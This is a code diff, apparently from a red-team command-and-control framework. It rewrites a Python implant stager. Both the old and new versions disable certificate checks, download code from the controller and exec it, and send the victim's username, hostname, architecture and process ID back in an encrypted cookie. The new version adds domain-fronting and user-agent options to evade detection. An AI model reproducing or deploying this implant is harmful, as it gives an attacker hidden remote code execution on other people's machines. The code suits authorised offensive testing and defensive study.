@@ -27,11 +27,27 @@ class Payloads(object):
     self.ConnectURL = ConnectURL
     self.BaseDirectory = BaseDirectory
     self.PythonKey = gen_key()
-    self.Python = """import urllib2,os,sys,base64,ssl,socket,pwd;ssl._create_default_https_context = ssl._create_unverified_context;pykey='%s';key='%s';o=urllib2.build_opener();a=o.open("%s");b=a.read(); 
-if pykey in b: exec(b); 
-else: sys.exit(0);
-un = pwd.getpwuid( os.getuid() )[ 0 ];pid = os.getpid();is64 = sys.maxsize > 2**32; arch = ('x64' if is64 == True else 'x86');hn = socket.gethostname(); o = urllib2.build_opener();encsid = encrypt(key, '%%s;%%s;%%s;%%s;%%s;' %% (un,hn,hn,arch,pid));o.addheaders.append(('Cookie', 'SessionID=%%s' %% encsid));response = o.open('%s'); html = response.read(); x=decrypt(key, html).rstrip('\\0'); exec(x)
-    """ % (self.PythonKey,self.Key,(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"),(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"))
+    self.Python = """import urllib2,os,sys,base64,ssl,socket,pwd
+pykey="%s"
+key="%s"
+url="%s"
+url2="%s"
+hh="%s"
+ua="%s"
+ssl._create_default_https_context=ssl._create_unverified_context
+if hh: r=urllib2.Request(url,headers={'Host':hh,'User-agent':ua})
+else: r=urllib2.Request(url,headers={'User-agent':ua})
+res=urllib2.urlopen(r);b=res.read() 
+if pykey in b: exec(b)
+else: sys.exit(0)
+un=pwd.getpwuid( os.getuid() )[ 0 ];pid=os.getpid()
+is64=sys.maxsize > 2**32;arch=('x64' if is64 == True else 'x86')
+hn=socket.gethostname();o=urllib2.build_opener()
+encsid=encrypt(key, '%%s;%%s;%%s;%%s;%%s;' %% (un,hn,hn,arch,pid))
+if hh:r=urllib2.Request(url2,headers={'Host':hh,'User-agent':ua,'Cookie':'SessionID=%%s' %% encsid})
+else:r=urllib2.Request(url2,headers={'User-agent':ua,'Cookie':'SessionID=%%s' %% encsid})
+res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\\0');exec(x)
+    """ % (self.PythonKey,self.Key,(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"),(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"),self.DomainFrontHeader,self.UserAgent)
     self.C2Core = """%s
 $sc="%s"
 $s="%s"
